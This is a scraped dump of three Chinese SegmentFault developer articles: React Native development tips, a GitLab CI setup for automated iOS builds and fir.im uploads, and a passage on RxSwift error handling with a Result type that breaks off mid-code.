              &lt;View style={styles.row}&gt;
                &lt;Image style={styles.thumb} source={{uri: rowData['game_icon']}} /&gt;
                &lt;Text numberOfLines={1} style={styles.text}&gt;
                  {rowData['game_name']}
                &lt;/Text&gt;
              &lt;/View&gt;
            &lt;/View&gt;
&lt;/TouchableHighlight&gt;</code></pre>
<p><a href=""https://github.com/JackPu/react-native-tips/blob/master/example/pages/home.js"" rel=""nofollow noreferrer"">详细代码</a></p>
<h3>5.混合使用webview</h3>
<p>无论什么时候，作为一个前端er，在遇到比较棘手的问题时候，我们都可以回到原点，用一个网页去解决。因此无论如何都需要学会使用React Native webview。除此之外，部分页面，其实完全可以由网页去支持<strong>多端</strong>共用的功能，楼主亲身遇到过的场景，就是图表的绘制，我们的方案是一个页面，需要微信，手机网页，和android,ios都具备该功能，而且我们手机网页和客户端打开的稍微有区别，需要隐藏header。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVzxDN"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""vuedc026487dfb0a62593d61ac2927fa727c.png"" title=""vuedc026487dfb0a62593d61ac2927fa727c.png""></span></p>
<p>上图是网页版本的，而我们通过设置页面的查询参数即来自客户端的请求或者微信的都会设置为类似这样的url</p>
<pre><code class=""bash"">https://xxx.yoursites.com/page.html?hide_header=1&amp;client=ios</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bVzxDM"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""vueda93127c21932b45b981c0d785f7c284f.png"" title=""vueda93127c21932b45b981c0d785f7c284f.png""></span></p>
<p>而在React Native 设置webview 的代码也很简单，你可以查看这里<a href=""https://github.com/JackPu/react-native-tips/blob/master/example/pages/web.js"" rel=""nofollow noreferrer"">代码</a></p>
<h3>6.设置网络请求Fetch</h3>
<p>由于客户端也需要大量接口的支持，因此我们一定避免单兵作战，需要请求时候用个<code>fetch</code>，这样其实非常不易控制数据的流入。建议在fetch上在封装一次，这样我们就可以做更多的事情，比如做统一的错误提示，用户失效控制，统一设置接口请求的header,同时可以方便我们进行调试，在chrome中查看具体的接口数据等。</p>
<pre><code class=""js"">send(url,options) {
        var isLogin = this.isLogin();
        
        var self = this;        
        var defaultOptions = {
            method: 'GET',
            error: function() {
                options.success({'errcode':501,'errstr':'系统繁忙,请稍候尝试'});
            },
            headers:{
                'Authorization': this.getAccessToken(),
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'App': 'vanthink-ios-app'
            },
            data:{
                // prevent ajax cache if not set 
                '_regq' : self.random()
            },
            dataType:'json',
            success: function(result) {}
        };
        
        var options = Object.assign({},defaultOptions,options);
        var httpMethod = options['method'].toLocaleUpperCase();
        var full_url = '';
        if(httpMethod === 'GET') {
            full_url = this.config.api +  url + '?' + this.serialize(options.data);
        }else{
            // handle some to 'POST'
            full_url = this.config.api +  url;
        }
        
        if(this.config.debug) {
            console.log('HTTP has finished %c' + httpMethod +  ':  %chttp://' + full_url,'color:red;','color:blue;');
        }
        options.url = full_url;
        
        
        var cb = options.success;
      
        // build body data 
        if(options['method'] != 'GET') {
            options.body = JSON.stringify(options.data);
        }
  
        // todo support for https
        return fetch('http://' + options.url,options)
               .then((response) =&gt;  response.json())
               .then((res) =&gt; {      
                    self.config.debug &amp;&amp; console.log(res);
                    if(res.errcode == 101) {
                        return self.doLogin();
                    }

                    if(res.errcode != 0) {

                        self.handeErrcode(res);
                    }  
                    return cb(res,res.errcode==0);
                })
                .catch((error) =&gt; {
                  console.warn(error);
                });
    },
    
    
    handeErrcode: function(result) {
        // not login
        if(result.errcode == 123){
           // your code to do
            
            return false; 
        }
       
        return this.sendMessage(result.errstr);
    },</code></pre>
<h3>7.管理你的Icon</h3>
<p>在网页中我们经常可以看到非常多的小的icon，我们习惯性的用Css Sprite 和 Icon Font或者 Svg去解决这些问题。移步到客户端，同样，我们也有很多解决方案，但是有一点必须要明确，将icon放到同一个地方，方便管理。这里有很多第三方库选择：</p>
<ul>
<li><p><a href=""https://github.com/corymsmith/react-native-icons"" rel=""nofollow noreferrer"">react-native-icons</a></p></li>
<li><p><a href=""https://github.com/oblador/react-native-vector-icons"" rel=""nofollow noreferrer"">react-native-vector-icons</a></p></li>
</ul>
<p>如果自己写的话，可以写到一个组件中，通过设置一个基类，然后进行继承和导出。设置不同的图标思路大概如下：</p>
<pre><code class=""js"">import React, { TouchableHighlight,View,Text, Image, StyleSheet, PropTypes } from 'react-native';

// 基本的样式
let styles = StyleSheet.create({
  icon: {
    width: 21,
    height: 21,
    marginTop: 4,
    marginRight: 15,
  }, 
});

class Icons extends React.Component { 
    constructor(props) {
        super(props);
        this.press = this.press.bind(this);
      }

      press() {
        if(typeof this.props.press == 'function') {
            this.props.press();
        }else{
            // TODO
        }
        
      }
      _renderIcon() {
        return (
            &lt;Image source={require('../images/baseicon.png')} style={styles.icon} /&gt;
        );  
      }

      render() {
        return (
          &lt;TouchableHighlight underlayColor=""transparent"" onPress={this.press}&gt;
            {this._renderIcon()}
          &lt;/TouchableHighlight&gt;
        );
      }
    
}

// 继承
class CloseIcon extends Icons {
    _renderIcon() {
        return (
            &lt;Image source={require('../images/Delete-48.png')} style={styles.icon} /&gt;
        );  
      }
}
class SearchIcon extends Icons {
    _renderIcon() {
        return (
            &lt;Image source={require('../images/Search-50.png')} style={styles.icon} /&gt;
        );  
      }
}

// 导出
module.exports = {
    CloseIcon,
    SearchIcon,    
};</code></pre>
<p>而我们则可以在页面中这样使用</p>
<pre><code class=""javascript"">import {CloseIcon,SearchIcon} from '../style/icon';

...

render() {
    return(
        //... some code
        &lt;CloseIcon&gt;&lt;/CloseIcon&gt;
    );
}</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/bVzxDL"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""vued9b724a613dd793d0e95400ff4e6884d7.png"" title=""vued9b724a613dd793d0e95400ff4e6884d7.png""></span></p>
<h3>8.构建一个导航条</h3>
<p>当然制作App中，我们经常会遇到制作导航条的要求,</p>
<p><span class=""img-wrap""><img data-src=""/img/bVzxDK"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""vued191da6d8d8d42ea7d69a8cf3c287cb3f.png"" title=""vued191da6d8d8d42ea7d69a8cf3c287cb3f.png""></span></p>
<p>大家可以使用<a href=""https://github.com/react-native-community/react-native-navbar"" rel=""nofollow noreferrer"">react-native-navbar</a>,自己写也非常简单，样式大致就这些:</p>
<pre><code class=""js"">    navBar: {
        height: 44,
        flexDirection: 'row',
        justifyContent: 'space-between',
        alignItems: 'stretch',
        backgroundColor:'#fff'
    },
    customTitle: {
        position: 'absolute',
        left: 0,
        right: 0,
        bottom: 7,
        alignItems: 'center',
    },
    navBarButtonContainer: {
        flexDirection: 'row',
        justifyContent: 'center',
        alignItems: 'stretch',
    },
    navBarButton: {
        flexDirection: 'row',
        justifyContent: 'center',
        alignItems: 'center',
    },
    navBarButtonText: {
        fontSize: 17,
        letterSpacing: 0.5,
    },
    navBarTitleContainer: {
        position: 'absolute',
        left: 0,
        right: 0,
        top: 0,
        bottom: 0,
        justifyContent: 'center',
        alignItems: 'center',
    },
    navBarTitleText: {
        fontSize: 17,
        color: '#333',
        fontWeight: '500',
    }</code></pre>
<p>用法如下:</p>
<pre><code class=""js"">&lt;View style={[styles.navBar,{backgroundColor: '#9b59b6'}]}&gt;
    &lt;View style={styles.navBarTitleContainer}&gt;
        &lt;Text style={[styles.navBarTitleText,{color: '#fff'}]}&gt;NavBar3&lt;/Text&gt;
    &lt;/View&gt;

    &lt;View style={[styles.navBarButtonContainer,{marginLeft:8}]}&gt;
        &lt;TouchableOpacity style={styles.navBarButton}&gt;
            &lt;View&gt;
                &lt;CloseIcon&gt;&lt;/CloseIcon&gt;
            &lt;/View&gt;
        &lt;/TouchableOpacity&gt;
    &lt;/View&gt;
    &lt;View style={[styles.navBarButtonContainer,{marginRight:8}]}&gt;
        &lt;TouchableOpacity style={styles.navBarButton}&gt;
            &lt;View&gt;
                &lt;Text style={[styles.navBarButtonText,{color: '#fff'}]}&gt;Done&lt;/Text&gt;
            &lt;/View&gt;
        &lt;/TouchableOpacity&gt;
    &lt;/View&gt;
&lt;/View&gt;</code></pre>
<p><em>需要注意，如果设置顶部导航条，记得还有状态栏的高度要算进去，一般设置都为<code>22</code></em></p>
<h3>9.结合 Redux</h3>
<p>想了想做个 App，有下面几个就可以了，界面不low, 数据支撑，用户响应即可。但是我们在做的时候Css和Html确实解决了Bo主不会写界面的问题，但是后面两个咋个办呢？于是乎官方推出了一个新的工具[Redux]()。<br>精炼一点就是Redux就是去去管理页面的状态（用户响应）及数据（接口数据相关）。Redux中强调了三点:</p>
<ul>
<li><p>单一数据源</p></li>
<li><p>State 是只读的</p></li>
<li><p>使用纯函数来执行修改</p></li>
</ul>
<p>而且Redux支持服务端，这样更加方便我们在进行异步的远程数据获取的实现。</p>
<p><a href=""https://github.com/alinz/example-react-native-redux"" rel=""nofollow noreferrer"">一个简单的使用Demo</a></p>
<h3>10.合理的使用第三方插件</h3>
<p>尽管React Native 正式发布的时间还不算非常长，但是npm上已经拥有了大量的第三方类库，因此我们在遇到问题或者强调快速开发的时候我们可以去第三方网<a href=""https://react.parts/native"" rel=""nofollow noreferrer"">react.parts</a>站寻找更好的组件。自己觉得常用的一些如下：</p>
<ul>
<li><p><a href=""https://github.com/umhan35/react-native-search-bar"" rel=""nofollow noreferrer"">react-native-search-bar</a><br>一款带有常用搜索框的组件</p></li>
<li><p><a href=""https://github.com/jsdf/react-native-refreshable-listview"" rel=""nofollow noreferrer"">react-native-refreshable-listview</a> 一款带有刷新列表组件</p></li>
<li><p><a href=""https://github.com/react-native-simple-router-community/react-native-simple-router"" rel=""nofollow noreferrer"">react-native-simple-router</a></p></li>
<li><p><a href=""https://github.com/brentvatne/react-native-video"" rel=""nofollow noreferrer"">react-native-video</a></p></li>
<li><p><a href=""https://github.com/Qwikly/react-native-router-redux"" rel=""nofollow noreferrer"">react-native-router-redux</a> 一款路由和redux结合的插件，组件比较丰富</p></li>
<li><p><a href=""https://github.com/marcshilling/react-native-image-picker#usage"" rel=""nofollow noreferrer"">react-native-image-picker</a> 一款选择图片的插件</p></li>
<li><p><a href=""https://www.npmjs.com/package/autobind-decorator"" rel=""nofollow noreferrer"">autobind-decorator</a> 省去每次都要声明<code>eventHandle.bind(this)</code></p></li>
</ul>
<h3>11.调试</h3>
<p>除了开发外，我们还希望能够很好的调试我们的App.默认的话，就像我们调试我们的web页面一样，我们可以用常用的<code>console.log</code>,<code>console.error</code>,<code>console.warn</code>，由于支持chrome调试，我们可以在控制台看到打印的数据。当然，我们也可以真机调试，比如连上你的iPhone,需要注意的是:</p>
<blockquote><p>你需要修改调试js的地址，在<code>AppDelegate.m</code>中将""localhost""改成你电脑的ip就可以了。</p></blockquote>
<p>选中你的iPhone就可以调试了。<br><span class=""img-wrap""><img data-src=""http://img1.vued.vanthink.cn/vued0b4083c14ced5cf04fbcefe13bb59238.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" gt;'=""""></span></p>
<p>当然我会持续更新，也欢迎大家pr，<a href=""https://github.com/JackPu/react-native-tips"" rel=""nofollow noreferrer"">项目地址</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVzxDI"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""vuedf40e6bef8963252bd7eaa81f689e5c56.jpg"" title=""vuedf40e6bef8963252bd7eaa81f689e5c56.jpg""></span><br>最后安利一个ppt <a href=""https://yunpan.cn/cqKEvrPXAS3gy"" rel=""nofollow noreferrer"">https://yunpan.cn/cqKEvrPXAS3gy</a> （提取码：0375）</p>
<hr>
<p>同步博客地址：<a href=""http://www.jackpu.com/react-native-kai-fa-xiao-tips/"" rel=""nofollow noreferrer"">http://www.jackpu.com/react-n...</a></p>

                ", React Native 开发小Tips,1531972016,207,1,585,1,1,https://segmentfault.com/a/1190000006048459
95,1,0,6,"
                    
<h2>概念</h2>
<p>原先搭建这套东西其实没多少事，但是受人邀请，还是写篇文章防止后来人踏坑吧。</p>
<p>持续集成系统（CI）想必看文章的应该都知道是什么东西，应该都清楚，如果不太明白的，移步 <a href=""https://en.wikipedia.org/wiki/Continuous_integration"" rel=""nofollow noreferrer"">https://en.wikipedia.org/wiki/Continuous_integration</a></p>
<p>总结起来其实也很简单： 把构建和发布的问题自动化、简单化。</p>
<p>你可以想象这么一个场景：</p>
<blockquote><p>当你的代码写完后，敲入一个git push，CI 系统自动帮你<code>compile</code>/<code>test</code>/<code>archive</code>/<code>publish</code> 而你只需要坐在那边，喝一杯<code>java</code>就够了。</p></blockquote>
<p>对于爱“偷懒”的程序员来说，这是十分惬意的事情，因为我们最自豪的就是解放自己的生产力，让自己不要花时间去做一些无意义的事情，既伤神又费力。</p>
<h2>安装Gitlab</h2>
<p>当然，在当今的时代，我们拥有docker这种神器，其实安装这件事情，也已经很傻瓜化了。</p>
<p>OK，那么简单几行命令搞定</p>
<pre><code class=""bash"">docker pull gitlab/gitlab-ce
docker run -d -P gitlab/gitlab-ce      </code></pre>
<p>如果需要进行端口映射，请参考<code>-p</code>参数</p>
<p>当你配置好之后，访问你的母鸡地址，出现这个页面就是部署好了，然后就是注册和登陆的事情。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVzusV"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<h2>安装Gitlab CI Runner</h2>
<p><code>Gitlab</code>最新版中已经将<code>CI</code>系统内置了，所以我们只需要部署<code>runner</code>即可。<code>runner</code>是啥概念？因为我们的<code>CI</code>在跑的时候，不应该被它的安装环境所限制，比如我们把<code>CI</code>安装在<code>linux</code>下，这时候想打包<code>iOS</code>可能就办不到了，所以<code>Gitlab CI</code>就把整个 CI 拆成两个部分，一个<code>server</code>和一个<code>runner</code>，如今<code>server</code>也都内置到<code>Gitlab</code>里去了，所以安装好了就好了。</p>
<p>那么我们可以在一台 Mac 上安装好<code>runner</code>连上<code>Gitlab</code>即可。</p>
<p><a href=""https://gitlab.com/gitlab-org/gitlab-ci-multi-runner"" rel=""nofollow noreferrer"">https://gitlab.com/gitlab-org/gitlab-ci-multi-runner</a></p>
<p>这个传送门是到<code>gitlab-ci-multi-runner</code>的，上面有介绍了如何安装使用<code>runner</code>。但是要注意的是，它一般都会在<code>linux</code>环境下使用的比较多，而在<code>windows</code>和<code>OS X</code>下好像并没有，这也是为什么我这次踩坑的原因了。</p>
<p>首先，我们下载好<code>gitlab-ci-multi-runner</code>的二进制文件，我们知道要把它做成服务的话，需要以下步骤：</p>
<ul>
<li><p>register</p></li>
<li><p>install</p></li>
<li><p>start</p></li>
</ul>
<p><code>register</code>就是告诉<code>server</code> 这个<code>runner</code>的存在，<code>install</code>是安装成系统服务，<code>start</code>就是启动服务啦~ 这3个命令很简单。</p>
<p>那么，我们先执行<code>gitlab-ci-multi-runner</code>的<code>run</code>看，它是不安装系统服务，直接跑的命令。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVzuut"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>好嘛，一来就发现刺眼的3个<code>warning</code>，对，就是这3个<code>warning</code>把我带入了深渊。 它的意思很明确，要求我们用<code>root</code>身份执行这个命令。</p>
<blockquote><p>但是！！ <code>root</code>是不能在Xcode <code>archive</code> 完之后 进行<code>codesign</code>的！即时你在<code>gitlab-ci-multi-runner</code>指定了 <code>--user</code> 也不行！！</p></blockquote>
<p>所以，我们在这里要做的就是无视这3个warning，转而用我们自己用户的身份进行安装服务</p>
<pre><code class=""bash"">gitlab-ci-multi-runner install --config xxxx -d /tmp
gitlab-ci-multi-runner start</code></pre>
<p>即可，<code>-d</code>是指定<code>runner</code>的工作目录，也就是把代码库<code>clone</code>下来的目录，我指定到了<code>/tmp</code>文件夹。</p>
<h2>使用 xcodebuild 和 xctool</h2>
<p><code>xcodebuild</code> 就是 <code>Xcode</code> 的命令行工具能提供 编译/测试/打包 等功能，我们只需要指定<code>workspace</code>和<code>scheme</code>或者<code>project</code>即可编译，指定好<code>Provisioning Profile</code>等证书文件就能打包，但是它的输出非常不好看，这次我们使用了<code>xctool</code> 这个工具，它是<code>facebook</code>开发的，用来美化<code>xcodebuild</code>输出的一个辅助工具，个人很喜欢它的输出样式。</p>
<p>安装<code>xctool</code>也很简单：</p>
<pre><code class=""bash"">brew install xctool</code></pre>
<p>来一个使用<code>xctool</code>的样例：</p>
<pre><code class=""bash"">xctool -workspace SegmentFault.xcworkspace  -scheme $PRERELEASE_SCHEME archive -archivePath ./build/SegmentFault.xcarchive</code></pre>
<p>这里我们指定了<code>workspace</code>和<code>scheme</code>（我用环境变量代替），然后指定了导出<code>xcarchive</code>中间格式的路径，那么我们导出成<code>xcarchive</code>就完成了，如果要导出成<code>IPA</code>，需要这个中间产物。</p>
<h3>导出IPA</h3>
<p>然后导出IPA，我们使用<code>xcodebuild</code>命令：</p>
<pre><code class=""bash"">xcodebuild -exportArchive -archivePath ./build/SegmentFault.xcarchive -exportPath ./build -exportOptionsPlist ./ExportOptions.plist CODE_SIGN_IDENTITY=""$CODE_SIGN_IDENTITY"" PROVISIONING_PROFILE=""$PROVISIONING_PROFILE""</code></pre>
<p><code>ExportOptions.plist</code>里面指定了一些选项，比如导出的环境（AppStore/AdHoc/Developer等），其实就是我们在<code>Xcode</code>/<code>Origanizer</code>中配置到的那些：</p>
<pre><code class=""xml"">&lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;
&lt;!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""&gt;
&lt;plist version=""1.0""&gt;
&lt;dict&gt;
    &lt;key&gt;compileBitcode&lt;/key&gt;
    &lt;false/&gt;
    &lt;key&gt;method&lt;/key&gt;
    &lt;string&gt;ad-hoc&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;</code></pre>
<p>执行完<code>xcodebuild</code> 就得到了我们的<code>ipa</code>文件，如果是手工敲命令的话，就是这么几个步骤。</p>
<h2>集成到Gitlab</h2>
<p>那么如何让CI跑这些命令呢？这时候我们就需要使用<code>Gitlab CI</code>中的<code>.gitlab.yml</code>这个文件了，<code>Gitlab</code>只要检测到有这个文件，就会开始构建你的项目，具体的使用说明可以看这里：<a href=""http://docs.gitlab.com/ce/ci/yaml/README.html"" rel=""nofollow noreferrer"">http://docs.gitlab.com/ce/ci/yaml/README.html</a></p>
<p>那么贴一个我的样例</p>
<pre><code class=""yml"">variables:
    PRERELEASE_SCHEME: ""SegmentFault_Alpha""
    CODE_SIGN_IDENTITY: ""xxxxxx""
    PROVISIONING_PROFILE: ""xxxxx""
    LANG: ""en_US.UTF-8""

stages:
  - archive
  - upload

archive:
    stage: archive
    script:
        - pod install
        - carthage update --platform iOS
        - xctool -workspace SegmentFault.xcworkspace  -scheme $PRERELEASE_SCHEME archive -archivePath ./build/SegmentFault.xcarchive
        - ""xcodebuild -exportArchive -archivePath ./build/SegmentFault.xcarchive -exportPath ./build -exportOptionsPlist ./ExportOptions.plist CODE_SIGN_IDENTITY=\""$CODE_SIGN_IDENTITY\"" PROVISIONING_PROFILE=\""$PROVISIONING_PROFILE\""""
    only:
        - fir
    artifacts:
        expire_in: '1 day'
        paths:
            - ./build/$PRERELEASE_SCHEME.ipa
upload:
    stage: upload
    only:
        - fir
    script:
        - fir publish -T xxxxxx -c ./CHANGELOG ./build/$PRERELEASE_SCHEME.ipa
    dependencies:
        - archive</code></pre>
<p>这里我们看到<code>stages</code>总共做了2个任务<code>archive</code>和<code>upload</code>，我在<code>archive</code>的定义中，执行了4条命令，分别是<code>pod</code>相关，<code>carthage</code>相关，然后是<code>xcodebuild</code>相关命令进行打包，iOS程序员应该都知道<code>pod</code>和<code>carthage</code>吧，是在打包前给我们安装依赖的，依赖安装好了才能构建，这是常识。</p>
<p>在这个步骤完成之后，我们执行<code>upload</code>任务，就是调用<code>fir-cli</code>这个工具，把我们的应用发布到<code>fir.im</code>上，给测试人员分发测试。</p>
<h2>结语</h2>
<p>好了，我终于从在<code>Xcode</code>中进行打包，导出后到<code>fir.im</code>上进行上传<code>ipa</code>操作，并写<code>Change Log</code>任务这么一系列很繁琐的工作中解脱了，以后我就只需在<code>fir</code>这个分支上进行一次<code>push</code>，那么所有的工作就都做完了，这就是<code>CI</code>的魅力。</p>
<p>赶紧试试吧~</p>

                ", 搭建 iOS 自动打包发布持续集成系统,1531972017,452,1,842,1,1,https://segmentfault.com/a/1190000006036548
96,1,0,6,"
                    
<h2>摘要</h2>
<p>本文上半部分将为您解释为什么在实际项目中为什么不要调用 <code>onError</code> 以及尽量不使用 <code>Driver</code> 。同时给出一种合理的解决方案，让我们仍然可以愉快的传递 Error ，并对 Value 进行处理。<br>下半部分将介绍用函数式来精简我们的代码。</p>
<blockquote><p>注：本文基于 Swift 3 。</p></blockquote>
<h2>忘记 <code>onError</code>
</h2>
<h3>
<code>onError</code> 释放资源</h3>
<p>可能这个标题有些吼人，不是说 Rx 中的 Error 处理是很好的方案吗？可以把 Error 归到一起处理。笔者在这里也觉得这是一个很好的方案，但有一个地方非常头疼，发射 Error 后是释放对应的事件链，也就是数据流。还是用网络请求举例，比如登录。我们打算做一个登录 －》 成功 －》保存 token －》 用 token 获取用户信息等等。<br>在登录的部分，点击登录，进行验证，很明显，如果密码有误，<br>画图，</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008576694"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>图片表达的很清晰，对应代码的代码是：</p>
<pre><code>
button
    .rx_tap // 点击登录
    .flatMap(provider.login) // 登录请求
    .map(saveToken) // 保存 token
    .flatMap(provider.requestInfo) // 获取用户信息
    .subscribe(handleResult) // 处理结果
</code></pre>
<p>代码和流程图是一个样子的，效果还不错。<br>运行一下，输入正确的账号密码，登录，登录成功，获取用户信息。一切正常。<br>但是我们来看下面这种场景，登录失败（不论是因为网络错误，还是因为密码错误之类的原因，我们都对这些错误调用了 <code>onError</code> 传递错误信息），直接将 error 传递到事件结尾，即显示登录错误的信息。此时再去点击登录就不会有任何提示了。<br>因为上面这一条点击登录事件链都被 dispose 了。</p>
<p>这是一个 bug 。我们不希望在第一次点击登录失败后，再次点击登录缺没什么反应。</p>
<blockquote><p>事实上在 <a href=""http://www.tryswiftconf.com/en%20"" rel=""nofollow noreferrer"">Try! Swift</a> 大会上有一场 POP 的分享，Demo 地址 <a href=""https://github.com/tryswift/RxPagination%20"" rel=""nofollow noreferrer"">RxPagination</a> 。试着把网络关了，拉取一下数据，再打开网络，再拉取一下数据看看？此时是没有什么反应的。补一句，这个项目是值得学习一下的。</p></blockquote>
<h3>用官方的方法处理 Error ？</h3>
<p>在讨论用官方的方式处理 Error 前，我们先来确认一件事情，处理一个登录流程，如果出现了错误是否应该继续下去，答案是显然的，不继续，停止本次事件。</p>
<p>官方给出了一下几种操作：</p>
<ul>
<li><p><code>retry</code></p></li>
<li><p><code>catchError</code></p></li>
<li><p><code>catchErrorJustReturn</code></p></li>
<li><p><code>doOnError</code></p></li>
</ul>
<p>很可惜，前三种方法都是处理 error ，将 error 变换成正常的值继续下去，并没有停止本次事件。而 <code>doOnError</code> 只是在出现 error 的时候做点什么事情，并不能对事件流有什么影响。</p>
<h2>使用 Result</h2>
<pre><code>enum Result&lt;T&gt; {
    case value(T)
    case error(ErrorProtocol)
}
</code></pre>
<p>Swift 中的枚举关联值是如此的强大，这可以帮我们解决 Error 的处理，如果 case 为 error ，那就不处理，将 error 传递下去即可。</p>
<p>相比原有的 <code>onError</code> 有如下优势：</p>
<ul>
<li><p>不因为 error 释放资源</p></li>
<li><p>方便对 error 传递、<strong>处理</strong></p></li>
</ul>
<p>类似这样：</p>
<pre><code>
provider.request(GitHubAPI.Authorize)
    .map { result -&gt; Result&lt;String&gt; in
        switch result {
        case .value(let value):
            return Result.value(value[""token""].stringValue)
        case .error(let error):
            return Result.error(error)
        }
    }
    .flatMap { result -&gt; Observable&lt;Result&lt;JSON&gt;&gt; in
        switch result {
        case .value(let token):
            return provider.request(GitHubAPI.AccessToken(code: token))
        case .error(let error):
            return Observable.just(Result.error(error))
        }
    }
    .subscribeNext { json in
        // ...
    }
</code></pre>
<p>catch 等系列方法也可以直接在这里替代，而且更灵活了一些，可以返回任何我们想要的类型。</p>
<h3>过多的“无用”代码</h3>
<p>比如我们要进行多个操作，在第一个或第二个操作就可能出现 error 时，我们的代码会变得很臃肿，也就是有很多的 <code>case .error(let error): </code> 的代码。<br>这并不优雅。</p>
<h2>摘要</h2>
<p>在上一篇 在实践中应用 RxSwift 1 － 使用 Result 传递值中，我们解决了 error 的处理，但当我们处理一段很长的事件流时，会发现有很多不重要的代码，比如传递 Error 。本文将讨论一种优雅的方式处理该问题 － 函数式。本文结构分为两部分，第一部分讨论上一篇的 error 问题，第二部分再写一些其它的小函数，方便我们更好的写代码。</p>
<blockquote><p>注：<br>本文不会为您解释过多关于函数式的内容，如果您需要了解，可以阅读 Chris 的 Functional Swift ，本书还有对应的中文版 函数式 Swift 。</p></blockquote>
<pre><code>
enum Result&lt;Value&gt; {
    case value(Value)
    case error(ErrorProtocol)
}
</code></pre>
<h2>为 Result 添加 map 和 flatMap</h2>
<p>在上一节，我们用 <code>Result</code> 解决了 <code>onError</code> 的问题， 但缺带来了很多重复处理 <code>Error</code> 的代码。先来尝试下 <code>Monad</code> 的方案。先来写个 <code>map</code>。</p>
<pre><code>
func map&lt;T&gt;(_ transform: (Value) throws -&gt; T) -&gt; Result&lt;T&gt; {
    switch self {
    case .value(let object):
        do {
            let nextObject = try transform(object)
            return Result&lt;T&gt;.value(nextObject)
        } catch {
            return Result&lt;T&gt;.error(error)
        }
    case .error(let error):
        return Result&lt;T&gt;.error(error)
    }
}
</code></pre>
<p>可以看到我们这个 <code>map</code> 的实现还是很完善的：</p>
<ul>
<li><p>支持对 <code>value</code> 的变换</p></li>
<li><p>支持抛出 <code>error</code></p></li>
</ul>
<p>笔者认为这基本满足了我们的需求，传递 Error ，对 value 进行变换，抛出错误。现在我们可以把上一篇的代码改成下面这个样子：</p>
<pre><code>
provider
    .request(GitHubAPI.Authorize)
    .map { result in
        result.map { json in
            return json[""token""].stringValue
        }
    }
    .flatMap { result -&gt; Observable&lt;Result&lt;JSON&gt;&gt; in
        switch result {
        case .value(let token):
            return provider.request(GitHubAPI.AccessToken(code: token))
        case .error(let error):
            return Observable.just(Result.error(error))
        }
    }
    .subscribeNext { json in
        // ...
    }
</code></pre>
<p>易读性仍然不够，我们继续。</p>
<p>在 Rx 中，<code>map</code> 和 <code>flatMap</code> 是最常用的，我们添加一些小工具。</p>
<h2>mapValue</h2>
<pre><code>
func mapValue&lt;T, K&gt;(_ transform: (T) throws -&gt; K) -&gt; (Result&lt;T&gt;) -&gt; Result&lt;K&gt; {
    return { result in
        result.map(transform)
    }
}
</code></pre>
<p>于是我们对 <code>Result</code> 的 <code>map</code> 操作可以变成这个样子：</p>
<pre><code>
    .map(mapValue { json in
        return json[""token""].stringValue
    }
</code></pre>
<p>优雅了很多，不需要再处理 error 问题了。</p>
<h2>flatMapRequest</h2>
<p>类似的，我们还可以对网络请求的 <code>flatMap</code> 下手。</p>
<pre><code>
func flatMapRequest&lt;T&gt;(_ transform: (T) -&gt; Target) -&gt; (Result&lt;T&gt;) -&gt; Observable&lt;Result&lt;JSON&gt;&gt; {
    return { result in
        let api = result.map(transform)
        switch api {
        case .value(let value):
            return provider.request(value)
        case .error(let error):
            return Observable.just(Result.error(error))
        }
    }
}
</code></pre>
<p>完整的调用就变成了这个样子：</p>
<pre><code>
provider
    .request(GitHubAPI.Authorize)
    .map(mapValue { json in
        return json[""token""].stringValue
        })
    .flatMap(flatMapRequest { token in
        return GitHubAPI.AccessToken(code: token)
    })
    .subscribeNext { result in
        // ...
    }
</code></pre>
<blockquote><p>注：<br>这里的 flatMapRequest 的 flatMap 并非真正的 flatMap ，笔者只是方便对应 Rx 中的 flatMap 操作。以此表示这个方法是用在 flatMap 上的。</p></blockquote>
<h2>其他小工具</h2>
<p>类似上面的方式，我们还可以写一些常用的方法：</p>
<pre><code>
func toTrue&lt;T&gt;() -&gt; T -&gt; Bool {
    return { _ in
        return true
    }
}
</code></pre>
<p>再比如调用 <code>rx_sendMessage</code> 时，我们可能不需要参数：</p>
<pre><code>
func toVoid&lt;T&gt;() -&gt; T -&gt; Void {
    return { _ in }
}
</code></pre>
<p>只需要 <code>Result</code>的 <code>value</code> 情况？同时获取 <code>value</code> ？</p>
<pre><code>
func filterValue&lt;T&gt;() -&gt; Result&lt;T&gt; -&gt; Observable&lt;T&gt; {
    return { result in
        switch result {
        case .value(let object):
            return Observable.just(object)
        case error(let error):
            return Observable.empty()
        }
    }
}
</code></pre>
<p>再比如只处理成功的情况：</p>
<pre><code>
func success&lt;T&gt;(_ action: (T) -&gt; Void) -&gt; Result&lt;T&gt; -&gt; Void {
    return { result in
        result.success(action)
    }
}
</code></pre>
<p>甚至是带有默认错误处理方法的函数，当然这里笔者就不再赘述，有兴趣可以自行试试看～</p>
<p>可以看到，在实现每一个操作符（比如 <code>map</code>）中传入的闭包，尝试这样函数式的代码，会减少写很多重复代码，重要的是，代码变得更加清晰易读了。此外，您还可以这样组织代码：</p>
<pre><code>
class FlatMap&lt;T&gt; {

    private init() { }

    static func request(api: (T) -&gt; Target) -&gt; (T) -&gt; Observable&lt;Result&lt;JSON&gt;&gt; {
        return { object in
            return provider.request(api(object))
        }
    }

